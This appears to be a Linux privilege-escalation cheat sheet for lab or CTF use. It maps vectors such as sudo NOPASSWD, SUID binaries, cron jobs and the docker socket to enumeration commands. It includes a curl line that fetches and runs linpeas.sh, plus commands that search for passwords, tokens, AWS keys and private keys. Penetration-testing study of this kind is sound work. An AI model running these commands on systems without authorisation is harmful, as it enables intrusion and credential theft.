# Short "what to try" mapping (common vectors → commands)
### Sudo NOPASSWD → sudo -l then sudo <allowed-command>; check GTFOBins for technique.
### SUID binary → google GTFOBins <binary>; test safe commands locally.
### Writable service binary → replace with benign script (lab): sudo systemctl stop <srv> → replace exec → sudo systemctl start <srv>.
### Cron runs script from /var/www → upload web file that cron will execute as root.
### SSH private key found → ssh -i id_rsa user@other-host.

### Linux: linpeas.sh, LinEnum.sh, pspy, lse.sh
```bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```
### Quick 10-minute checklist RUN FIRST

## identity & environment
```bash
id 
whoami 
uname -a 
cat /etc/os-release
hostnamectl
lsb_release -a 2>/dev/null || true
```

## current path / privileges
```bash
pwd 
echo $SHELL 
echo $PATH
```

## sudo rights
```bash
sudo -l 2>/dev/null || true
```
## quick process/network snapshot
```bash
ps aux --sort=-uid | head -n 30
ss -tunlp
netstat -tulnp 2>/dev/null
```


## quickly find SUIDs & writable places
```bash
find / -perm -4000 -type f 2>/dev/null | head -n 40
find / -xdev -writable -type d 2>/dev/null | head -n 50
```
## quick secrets/keys search
```bash
grep -R --line-number -i "password\|passwd\|secret\|token" /etc /home /var/www 2>/dev/null | head
find / -type f \( -iname "id_rsa*" -o -iname "*.pem" -o -iname "*.key" -o -iname "*.env" -o -iname "*.conf" \) 2>/dev/null | head
```
## cron & systemd / docker
```bash
crontab -l 2>/dev/null || true
ls -la /etc/cron* /var/spool/cron 2>/dev/null
ls -la /var/run/docker.sock 2>/dev/null
```
```bash
who 
w 
last
cat /etc/passwd
cat /etc/group
ls -la /home
for d in /home/*; do echo "=== $d ==="; ls -la $d; done
```

```bash
ps aux --sort=-uid | head -n 60
ps -eo pid,user,cmd --sort=user | head
ss -tunlp
netstat -tulnp 2>/dev/null
lsof -n -P -i | head
systemctl list-units --type=service --no-pager
```

## check suspicious services
```bash
systemctl status <service>
systemctl show <service> -p ExecStart -p User
systemctl cat <service>
```
## check binary path owner/permissions
```bash
ls -l /path/to/executable
```
## find SUID
```bash
find / -perm -4000 -type f 2>/dev/null | sort | uniq | sed -n '1,200p'
```
## find SGID
```bash
find / -perm -2000 -type f 2>/dev/null | head
```
## capabilities
```bash
getcap -r / 2>/dev/null | head
```

## dirs in PATH
```bash
echo $PATH | tr ':' '\n'
```
## check permissions
```bash
for p in $(echo $PATH | tr ':' ' '); do ls -ld $p; done
```
## find world writable dirs
```bash
find / -type d -perm -0002 -exec ls -ld {} \; 2>/dev/null | head
```
## view files referenced by cron jobs
```bash
crontab -l 2>/dev/null || true
ls -la /etc/cron* /var/spool/cron /etc/cron.d 2>/dev/null
```
```bash
grep -R --line-number "" /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

## search common patterns
```bash
grep -R --line-number -i "password\|passwd\|secret\|token\|aws_access_key" /etc /home /var/www 2>/dev/null | head
```
## find common secret file extensions
```bash
find / -type f \( -iname "*.env" -o -iname "*.conf" -o -iname "*.ini" -o -iname "*.bak" -o -iname "*.sql" \) 2>/dev/null | head
```
## search for private keys
```bash
find / -type f \( -iname "id_rsa*" -o -iname "*.pem" -o -iname "*.key" \) 2>/dev/null | head
```
## if socket accessible - escalate via container
```bash
ls -l /var/run/docker.sock 2>/dev/null
docker ps -a 2>/dev/null || true
```
## use searchsploit or manual research
```bash
searchsploit linux kernel `uname -r`
```

## list mounts & automounts
```bash
mount | column -t
df -h
```
## ACLs
```bash
getfacl -R /some/dir 2>/dev/null | sed -n '1,120p'
```
## find suid world-writable files
```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -ld {} \; 2>/dev/null | head
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # find writable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # find writable files
```
```bash
ls -la /etc/cron.daily/ # daily cron job in linux as scheldured task on Windows
```
```bash
sudo -l # check if user can run binary as root .... SEARCH NOPASSWD()
```
```bash
grep -r -l 'search-query-here' /path/to/search # search files witch contain -l ''
```

